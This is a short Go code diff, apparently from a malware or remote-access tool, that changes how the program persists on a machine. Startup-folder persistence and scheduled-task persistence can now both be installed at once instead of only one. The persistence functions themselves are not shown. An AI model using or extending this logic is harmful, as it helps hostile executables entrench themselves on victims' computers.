@@ -9,7 +9,8 @@ func main() {
 	// Attempt to create persistence of the current executable on the machine.
 	if StartupPersistence {
 		system.CreateStartupPersistence(AppDataFileName, AppDataFolderName)
-	} else if SchedulerPersistence {
+	}
+	if SchedulerPersistence {
 		system.CreateTaskSchedulerPersistence(AppDataFileName, AppDataFolderName)
 	}
 
